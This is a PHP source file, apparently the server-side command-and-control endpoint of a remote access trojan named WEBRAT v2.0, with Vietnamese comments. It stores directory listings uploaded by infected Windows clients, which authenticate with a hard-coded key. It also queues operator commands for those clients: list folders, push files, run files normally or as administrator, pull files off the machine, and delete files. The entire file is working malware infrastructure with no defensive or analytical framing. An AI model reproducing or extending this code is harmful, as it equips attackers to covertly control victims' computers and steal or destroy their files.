<?php
// =============================================================
//  WEBRAT v2.0 - File Manager API Endpoint (Progressive Stream)
//  Đến đâu cập nhật Server đến đấy, chỉ tải thư mục trang hiện tại
// =============================================================

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Api-Key');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

require_once __DIR__ . '/db.php';

define('CLIENT_API_KEY', 'WEBRAT_SECRET_KEY_2026');

function jsonOk($data = [], $msg = 'OK') {
    echo json_encode(['status' => 'ok', 'message' => $msg, 'data' => $data], JSON_UNESCAPED_UNICODE);
    exit;
}

function jsonErr($msg = 'Error', $code = 400) {
    http_response_code($code);
    echo json_encode(['status' => 'error', 'message' => $msg], JSON_UNESCAPED_UNICODE);
    exit;
}

function requireApiKey() {
    $key = $_SERVER['HTTP_X_API_KEY'] ?? $_GET['key'] ?? $_POST['key'] ?? '';
    if ($key !== CLIENT_API_KEY) {
        jsonErr('INVALID_API_KEY', 403);
    }
}

function requireDashboardAuth() {
    session_start();
    if (!isset($_SESSION['webrat_user'])) {
        jsonErr('NOT_AUTHENTICATED', 401);
    }
}

function getJsonBody(): array {
    $raw = file_get_contents('php://input');
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}

// Tự động khởi tạo bảng file_manager nếu chưa tồn tại
function autoMigrateFileManager(PDO $db) {
    try {
        $db->exec("CREATE TABLE IF NOT EXISTS `file_manager` (
          `id`          INT AUTO_INCREMENT PRIMARY KEY,
          `client_id`   VARCHAR(20) NOT NULL,
          `hwid`        VARCHAR(64) DEFAULT '',
          `parent_path` VARCHAR(500) NOT NULL,
          `path`        VARCHAR(500) NOT NULL,
          `name`        VARCHAR(255) NOT NULL,
          `type`        ENUM('dir', 'file') DEFAULT 'file',
          `size`        VARCHAR(50) DEFAULT '0 B',
          `bytes`       BIGINT DEFAULT 0,
          `modified_at` VARCHAR(50) DEFAULT '',
          `updated_at`  DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
          INDEX idx_client_parent (`client_id`, `parent_path`(255)),
          INDEX idx_hwid_parent (`hwid`, `parent_path`(255))
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
    } catch (Exception $e) {
        error_log('[WEBRAT FILE_MANAGER MIGRATE] ' . $e->getMessage());
    }
}

try {
    $db = getDB();
    autoMigrateFileManager($db);
} catch (Exception $e) {
    jsonErr('DATABASE_CONNECTION_FAILED', 500);
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';
if ($action === '') {
    $rawInput = file_get_contents('php://input');
    $jsonInput = json_decode($rawInput, true);
    if (is_array($jsonInput) && !empty($jsonInput['action'])) {
        $action = trim($jsonInput['action']);
    }
}

// Chuẩn hóa đường dẫn thư mục chuẩn C:\ (tự động bổ sung \ nếu bị mất)
function normalizePath($path) {
    $path = trim($path);
    if ($path === '' || $path === '/') {
        return 'C:\\';
    }
    // Chuyển / thành \
    $path = str_replace('/', '\\', $path);

    // Chuẩn hóa chữ cái ổ đĩa (vd: c:\ -> C:\)
    if (strlen($path) >= 2 && $path[1] === ':') {
        $path = strtoupper($path[0]) . substr($path, 1);
    }
    // Tự động sửa lỗi mất dấu \ sau C: (vd: C:Windows -> C:\Windows)
    if (strlen($path) >= 3 && $path[1] === ':' && $path[2] !== '\\') {
        $path = substr($path, 0, 2) . '\\' . substr($path, 2);
    }
    // Thêm \ vào cuối ổ đĩa như C: -> C:\
    if (strlen($path) === 2 && $path[1] === ':') {
        $path .= '\\';
    }
    // Xóa bớt dấu \ thừa ở cuối nếu không phải ổ đĩa như C:\
    if (strlen($path) > 3 && substr($path, -1) === '\\') {
        $path = rtrim($path, '\\');
    }
    return $path;
}

// Hàm phụ trợ Bulk Insert danh sách items vào DB
function insertFileItemsBatch(PDO $db, string $clientId, string $cleanHwid, string $targetPath, array $items) {
    if (empty($items)) return 0;
    
    $placeholders = [];
    $params = [];

    foreach ($items as $item) {
        $name = trim($item['name'] ?? '');
        if ($name === '') continue;

        $isDir = !empty($item['is_dir']);
        $type  = $isDir ? 'dir' : 'file';
        $size  = $item['size'] ?? ($isDir ? '<DIR>' : '0 B');
        $bytes = (int)($item['bytes'] ?? 0);
        $mtime = substr($item['mtime'] ?? '', 0, 50);

        $itemPath = rtrim($targetPath, '\\') . '\\' . $name;

        $placeholders[] = '(?, ?, ?, ?, ?, ?, ?, ?, ?)';
        array_push($params, $clientId, $cleanHwid, $targetPath, $itemPath, $name, $type, $size, $bytes, $mtime);
    }

    if (!empty($placeholders)) {
        $sql = 'INSERT INTO file_manager (client_id, hwid, parent_path, path, name, type, size, bytes, modified_at) VALUES ' . implode(', ', $placeholders);
        $db->prepare($sql)->execute($params);
        return count($placeholders);
    }
    return 0;
}

switch ($action) {

    // -------------------------------------------------------------
    // ACTION 1a: upload_dir_start
    // Được gọi khi bắt đầu quét một thư mục mới -> Xóa dữ liệu cũ
    // -------------------------------------------------------------
    case 'upload_dir_start':
        requireApiKey();
        $data = getJsonBody();
        $clientId   = trim($data['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? '');
        $targetPath = normalizePath($data['path'] ?? 'C:\\');

        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_ID');

        $cleanHwid = ltrim($hwid, '#');
        try {
            $delStmt = $db->prepare('DELETE FROM file_manager WHERE (client_id = ? OR client_id = ? OR hwid = ? OR (hwid != "" AND hwid = ?)) AND parent_path = ?');
            $delStmt->execute([$clientId, '#' . $cleanHwid, $hwid, $cleanHwid, $targetPath]);
            jsonOk(['path' => $targetPath], 'DIR_START_CLEARED');
        } catch (Exception $e) {
            jsonErr('DIR_START_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 1b: upload_dir_chunk
    // Đến đâu cập nhật Server đến đấy (gửi từng chunk 40-50 items)
    // -------------------------------------------------------------
    case 'upload_dir_chunk':
        requireApiKey();
        $data = getJsonBody();
        $clientId   = trim($data['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? '');
        $targetPath = normalizePath($data['path'] ?? 'C:\\');
        $items      = $data['items'] ?? [];

        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_ID');

        $cleanHwid = ltrim($hwid, '#');

        try {
            $inserted = insertFileItemsBatch($db, $clientId, $cleanHwid, $targetPath, $items);
            jsonOk(['chunk_count' => $inserted, 'path' => $targetPath], 'DIR_CHUNK_SAVED');
        } catch (Exception $e) {
            jsonErr('DIR_CHUNK_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 1c: upload_dir_list (Fallback lưu 1 lần)
    // -------------------------------------------------------------
    case 'upload_dir_list':
        requireApiKey();
        $data = getJsonBody();
        $clientId   = trim($data['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? '');
        $targetPath = normalizePath($data['path'] ?? 'C:\\');
        $items      = $data['items'] ?? [];

        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_ID');

        $cleanHwid = ltrim($hwid, '#');

        try {
            $db->beginTransaction();

            $delStmt = $db->prepare('DELETE FROM file_manager WHERE (client_id = ? OR client_id = ? OR hwid = ? OR (hwid != "" AND hwid = ?)) AND parent_path = ?');
            $delStmt->execute([$clientId, '#' . $cleanHwid, $hwid, $cleanHwid, $targetPath]);

            if (!empty($items) && is_array($items)) {
                $chunks = array_chunk($items, 80);
                foreach ($chunks as $chunk) {
                    insertFileItemsBatch($db, $clientId, $cleanHwid, $targetPath, $chunk);
                }
            }

            $db->commit();
            jsonOk(['count' => count($items), 'path' => $targetPath], 'DIR_LIST_SAVED');
        } catch (Exception $e) {
            if ($db->inTransaction()) {
                $db->rollBack();
            }
            jsonErr('UPLOAD_DIR_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 2: xemfile
    // Gửi lệnh "xemfile+<path>+<hwid>" vào hàng đợi commands
    // -------------------------------------------------------------
    case 'xemfile':
        requireDashboardAuth();
        $data = getJsonBody();
        $clientId   = trim($data['client_id'] ?? $_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? $_GET['hwid'] ?? $_POST['hwid'] ?? '');
        $targetPath = normalizePath($data['path'] ?? $_GET['path'] ?? $_POST['path'] ?? 'C:\\');

        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_OR_HWID');

        $cleanHwid = ltrim($hwid, '#');
        if ($cleanHwid === '' && $clientId !== '') {
            $cleanHwid = ltrim($clientId, '#');
        }
        if ($clientId === '') {
            $clientId = '#' . $cleanHwid;
        }

        $commandText = 'xemfile+' . $targetPath . '+' . $cleanHwid;

        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $commandText]);
            $cmdId = $db->lastInsertId();

            jsonOk([
                'command_id' => $cmdId,
                'command'    => $commandText,
                'client_id'  => $clientId,
                'hwid'       => $cleanHwid,
                'path'       => $targetPath
            ], 'XEMFILE_COMMAND_QUEUED');
        } catch (Exception $e) {
            jsonErr('XEMFILE_CMD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 3: get_files
    // Đọc danh sách file/thư mục từ Database
    // -------------------------------------------------------------
    case 'get_files':
        requireDashboardAuth();
        $clientId   = trim($_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($_GET['hwid'] ?? $_POST['hwid'] ?? '');
        $targetPath = normalizePath($_GET['path'] ?? $_POST['path'] ?? 'C:\\');

        $cleanHwid = ltrim($hwid, '#');
        $cleanClientId = ltrim($clientId, '#');

        try {
            $stmt = $db->prepare('SELECT * FROM file_manager WHERE (client_id = ? OR client_id = ? OR client_id = ? OR hwid = ? OR hwid = ? OR (hwid != "" AND hwid = ?)) AND parent_path = ? ORDER BY type ASC, name ASC LIMIT 1000');
            $stmt->execute([$clientId, $cleanClientId, '#' . $cleanClientId, $hwid, $cleanHwid, $cleanHwid, $targetPath]);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            jsonOk([
                'path'  => $targetPath,
                'files' => $rows
            ]);
        } catch (Exception $e) {
            jsonErr('GET_FILES_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 4: chofilene (hoặc create_folder)
    // Gửi lệnh "chofilene+<foldername>+<targetPath>+<cleanHwid>"
    // -------------------------------------------------------------
    case 'chofilene':
    case 'create_folder':
        requireDashboardAuth();
        $data = getJsonBody();
        $folderName = trim($data['foldername'] ?? $data['folder_name'] ?? 'NewFolder');
        $clientId   = trim($data['client_id'] ?? $_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? $_GET['hwid'] ?? $_POST['hwid'] ?? '');
        $targetPath = normalizePath($data['path'] ?? $_GET['path'] ?? $_POST['path'] ?? 'C:\\');

        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_OR_HWID');

        $cleanHwid = ltrim($hwid, '#');
        if ($cleanHwid === '' && $clientId !== '') {
            $cleanHwid = ltrim($clientId, '#');
        }
        if ($clientId === '') {
            $clientId = '#' . $cleanHwid;
        }

        // Định dạng lệnh chuẩn theo yêu cầu: chofilene+folder name+vị trí tạo+hwid
        $commandText = 'chofilene+' . $folderName . '+' . $targetPath . '+' . $cleanHwid;

        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $commandText]);
            $cmdId = $db->lastInsertId();

            jsonOk([
                'command_id'  => $cmdId,
                'command'     => $commandText,
                'client_id'   => $clientId,
                'hwid'        => $cleanHwid,
                'foldername'  => $folderName,
                'path'        => $targetPath
            ], 'CHOFILENE_COMMAND_QUEUED');
        } catch (Exception $e) {
            jsonErr('CHOFILENE_CMD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 5: chosene (hoặc upload_file_cmd)
    // Gửi lệnh "chosene+fileupload+vị trí tạo+hwid" vào bảng commands
    // -------------------------------------------------------------
    case 'chosene':
    case 'upload_file_cmd':
        requireDashboardAuth();
        $data = getJsonBody();
        $fileId     = trim($data['file_id'] ?? $data['fileupload'] ?? '');
        $clientId   = trim($data['client_id'] ?? $_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? $_GET['hwid'] ?? $_POST['hwid'] ?? '');
        $targetPath = normalizePath($data['path'] ?? $_GET['path'] ?? $_POST['path'] ?? 'C:\\');

        if ($fileId === '') jsonErr('MISSING_FILE_ID');
        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_OR_HWID');

        $cleanHwid = ltrim($hwid, '#');
        if ($cleanHwid === '' && $clientId !== '') {
            $cleanHwid = ltrim($clientId, '#');
        }
        if ($clientId === '') {
            $clientId = '#' . $cleanHwid;
        }

        // Định dạng lệnh chuẩn theo yêu cầu: chosene+fileupload+vị trí tạo+hwid
        $commandText = 'chosene+' . $fileId . '+' . $targetPath . '+' . $cleanHwid;

        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $commandText]);
            $cmdId = $db->lastInsertId();

            jsonOk([
                'command_id'  => $cmdId,
                'command'     => $commandText,
                'client_id'   => $clientId,
                'hwid'        => $cleanHwid,
                'file_id'     => $fileId,
                'path'        => $targetPath
            ], 'CHOSENE_COMMAND_QUEUED');
        } catch (Exception $e) {
            jsonErr('CHOSENE_CMD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 6: runfilenha (hoặc run_file)
    // Gửi lệnh "runfilenha+<pathfile>+<cleanHwid>" vào bảng commands
    // -------------------------------------------------------------
    case 'runfilenha':
    case 'run_file':
        requireDashboardAuth();
        $data = getJsonBody();
        $filePath   = normalizePath($data['pathfile'] ?? $data['filepath'] ?? $data['path'] ?? '');
        $clientId   = trim($data['client_id'] ?? $_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? $_GET['hwid'] ?? $_POST['hwid'] ?? '');

        if ($filePath === '') jsonErr('MISSING_FILEPATH');
        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_OR_HWID');

        $cleanHwid = ltrim($hwid, '#');
        if ($cleanHwid === '' && $clientId !== '') {
            $cleanHwid = ltrim($clientId, '#');
        }
        if ($clientId === '') {
            $clientId = '#' . $cleanHwid;
        }

        // Định dạng lệnh chuẩn theo yêu cầu: runfilenha+pathfile+hwid
        $commandText = 'runfilenha+' . $filePath . '+' . $cleanHwid;

        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $commandText]);
            $cmdId = $db->lastInsertId();

            jsonOk([
                'command_id' => $cmdId,
                'command'    => $commandText,
                'client_id'  => $clientId,
                'hwid'       => $cleanHwid,
                'pathfile'   => $filePath
            ], 'RUNFILENHA_COMMAND_QUEUED');
        } catch (Exception $e) {
            jsonErr('RUNFILENHA_CMD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 7: bolayfile (hoặc download_file_cmd)
    // Gửi lệnh "bolayfile+<pathfile>+<cleanHwid>" vào bảng commands
    // -------------------------------------------------------------
    case 'bolayfile':
    case 'download_file_cmd':
        requireDashboardAuth();
        $data = getJsonBody();
        $filePath   = normalizePath($data['pathfile'] ?? $data['filepath'] ?? $data['path'] ?? '');
        $clientId   = trim($data['client_id'] ?? $_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? $_GET['hwid'] ?? $_POST['hwid'] ?? '');

        if ($filePath === '') jsonErr('MISSING_FILEPATH');
        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_OR_HWID');

        $cleanHwid = ltrim($hwid, '#');
        if ($cleanHwid === '' && $clientId !== '') {
            $cleanHwid = ltrim($clientId, '#');
        }
        if ($clientId === '') {
            $clientId = '#' . $cleanHwid;
        }

        // Định dạng lệnh chuẩn theo yêu cầu: bolayfile+pathfile+hwid
        $commandText = 'bolayfile+' . $filePath . '+' . $cleanHwid;

        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $commandText]);
            $cmdId = $db->lastInsertId();

            jsonOk([
                'command_id' => $cmdId,
                'command'    => $commandText,
                'client_id'  => $clientId,
                'hwid'       => $cleanHwid,
                'pathfile'   => $filePath
            ], 'BOLAYFILE_COMMAND_QUEUED');
        } catch (Exception $e) {
            jsonErr('BOLAYFILE_CMD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 8: runfileadmin (hoặc run_file_admin)
    // Gửi lệnh "runfileadmin+<pathfile>+<cleanHwid>" vào bảng commands
    // -------------------------------------------------------------
    case 'runfileadmin':
    case 'run_file_admin':
        requireDashboardAuth();
        $data = getJsonBody();
        $filePath   = normalizePath($data['pathfile'] ?? $data['filepath'] ?? $data['path'] ?? '');
        $clientId   = trim($data['client_id'] ?? $_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? $_GET['hwid'] ?? $_POST['hwid'] ?? '');

        if ($filePath === '') jsonErr('MISSING_FILEPATH');
        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_OR_HWID');

        $cleanHwid = ltrim($hwid, '#');
        if ($cleanHwid === '' && $clientId !== '') {
            $cleanHwid = ltrim($clientId, '#');
        }
        if ($clientId === '') {
            $clientId = '#' . $cleanHwid;
        }

        // Định dạng lệnh chuẩn theo yêu cầu: runfileadmin+pathfile+hwid
        $commandText = 'runfileadmin+' . $filePath . '+' . $cleanHwid;

        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $commandText]);
            $cmdId = $db->lastInsertId();

            jsonOk([
                'command_id' => $cmdId,
                'command'    => $commandText,
                'client_id'  => $clientId,
                'hwid'       => $cleanHwid,
                'pathfile'   => $filePath
            ], 'RUNFILEADMIN_COMMAND_QUEUED');
        } catch (Exception $e) {
            jsonErr('RUNFILEADMIN_CMD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    // -------------------------------------------------------------
    // ACTION 9: cutfile (hoặc delete_file)
    // Gửi lệnh "cutfile+<pathfile>+<cleanHwid>" vào bảng commands
    // -------------------------------------------------------------
    case 'cutfile':
    case 'delete_file':
        requireDashboardAuth();
        $data = getJsonBody();
        $filePath   = normalizePath($data['pathfile'] ?? $data['filepath'] ?? $data['path'] ?? '');
        $clientId   = trim($data['client_id'] ?? $_GET['client_id'] ?? $_POST['client_id'] ?? '');
        $hwid       = trim($data['hwid'] ?? $_GET['hwid'] ?? $_POST['hwid'] ?? '');

        if ($filePath === '') jsonErr('MISSING_FILEPATH');
        if ($clientId === '' && $hwid === '') jsonErr('MISSING_CLIENT_OR_HWID');

        $cleanHwid = ltrim($hwid, '#');
        if ($cleanHwid === '' && $clientId !== '') {
            $cleanHwid = ltrim($clientId, '#');
        }
        if ($clientId === '') {
            $clientId = '#' . $cleanHwid;
        }

        // Định dạng lệnh chuẩn theo yêu cầu: cutfile+pathfile+hwid
        $commandText = 'cutfile+' . $filePath . '+' . $cleanHwid;

        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $commandText]);
            $cmdId = $db->lastInsertId();

            jsonOk([
                'command_id' => $cmdId,
                'command'    => $commandText,
                'client_id'  => $clientId,
                'hwid'       => $cleanHwid,
                'pathfile'   => $filePath
            ], 'CUTFILE_COMMAND_QUEUED');
        } catch (Exception $e) {
            jsonErr('CUTFILE_CMD_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    default:
        jsonErr('UNKNOWN_ACTION', 400);
}
